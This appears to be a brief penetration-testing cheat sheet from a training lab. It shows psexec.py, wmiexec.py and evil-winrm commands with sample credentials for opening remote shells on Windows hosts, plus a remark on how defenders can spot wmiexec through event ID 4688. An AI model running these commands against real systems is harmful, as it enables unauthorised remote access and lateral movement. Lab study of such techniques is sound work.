## psexec
```powershell
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125 
```

## wmiexec
```powershell
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation

## evil-winrm
```powershell
evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
```